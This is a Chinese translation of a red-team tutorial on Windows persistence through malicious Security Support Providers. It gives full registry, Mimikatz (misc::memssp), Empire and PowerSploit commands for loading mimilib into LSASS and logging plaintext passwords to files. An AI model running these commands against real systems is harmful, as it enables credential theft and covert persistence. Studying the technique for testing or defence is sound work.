# Window权限维持（七）：安全支持提供者

来源: 03-干货系列\Window权限维持整理\Window权限维持（七）：安全支持提供者.pdf

安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。LSASS进程正在
Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP
DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行
修补而无需接触磁盘。
该技术可用于收集一个系统或多个系统中的凭据，并将这些凭据与另一个协议（例如RDP，WMI等）结
合使用，以免干扰检测，从而在网络中保持持久性。向主机注入恶意安全支持提供程序需要管理员级别
的特权，并且可以使用两种方法：
1. 注册SSP DLL
2. 加载到内存
Mimikatz，Empire和PowerSploit支持这两种方法，可以在红队操作中使用。
Mimikatz
 
项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32）相同
的位置，以便为访问受感染主机的任何用户获得纯文本凭据。
将文件传输到上述位置后，需要修改注册表项以包括新的安全支持提供程序mimilib。
SSP – mimilib注册表
查看“安全软件包”注册表项将验证是否已注入恶意安全支持提供程序。
C:\Windows\System32\
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d 
"kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages

注册表–安全软件包
由于注册表已被篡改并且DLL存储在系统中，因此该方法将在重新启动后继续存在。当域用户再次通过
系统进行身份验证时，将创建一个名为kiwissp的新文件，该文件将记录帐户的凭据。
Mimikatz – kiwissp
另外，Mimikatz通过向LSASS注入新的安全支持提供程序（SSP）来支持内存技术选项。此技术不需
要将mimilib.dll放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。
C:\Windows\System32\kiwissp.log

Mimikatz –内存中的SSP
当用户再次通过系统进行身份验证时，将在System32中创建一个日志文件，其中将包含纯文本用户密
码。
.Mimikatz – mimilsa
Empire
 
privilege::debug
misc::memssp
C:\Windows\System32\mimilsa.log

Empire提供了两个模块，可用于枚举现有的SSP并在目标系统上安装恶意的SSP。默认情况下，枚举模
块将使用活动代理，并且不需要任何其他配置。
Empire – SSP 枚举
同样，直接查询注册表可以获取存在的SSP的值。
注册表SSP的枚举注册表
将恶意安全支持提供程序复制到System32并更新注册表项将结束该技术。
将mimilib.dll复制到System32
usemodule persistence/misc/get_ssps
execute
shell reg query hklm\system\currentcontrolset\control\lsa\ /v "Security 
Packages"
shell copy mimilib.dll C:\Windows\System32\

由于Empire包含一个模块，该过程可以自动进行，该模块将自动将DLL文件复制到System32并创建注
册表项。唯一的要求是在主机上设置mimilib.dll文件的路径。
Empire SSP安装
Empire还支持可以执行自定义Mimikatz命令的脚本。
Mimikatz – SSP命令
Empire还支持在进程的内存中注入恶意SSP。下面的模块将调用Mimikatz脚本并直接执行memssp命
令，作为使该技术自动化的另一种方法。
usemodule persistence/misc/install_ssp*
set Path C:\Users\Administrator\mimilib.dll
execute
usemodule credentials/mimikatz/command
set Command misc::memssp
execute
usemodule persistence/misc/memssp*
execute

Empire – memssp
PowerSploit
 
PowerSploit包含两个可以执行相同任务的脚本。在Mimikatz的PowerShell变体“ Invoke-
Mimikatz ”中，执行以下命令将使用内存中技术。
PowerSploit – Mimikatz SSP
或者，将恶意的SSP DDL文件传输到目标主机并使用模块Install-SSP将DLL复制到System32，并将
自动修改相关的注册表项。
PowerSploit –安装SSP
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "misc::memssp"
Import-Module .\PowerSploit.psm1
Install-SSP -Path .\mimilib.dll

SharpSploitConsole
 
Mimikatz已集成到SharpSploitConsole中，该应用程序旨在与Ryan Cobb发布的SharpSploit进行交
互。SharpSploit是一个.NET后期开发库，具有与PowerSploit类似的功能。当前，
SharpSploitConsole通过Mimikatz模块支持内存技术。
SharpSploitConsole – memssp
 
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
SharpSploitConsole_x64.exe Interact
Mimi-Command misc::memssp

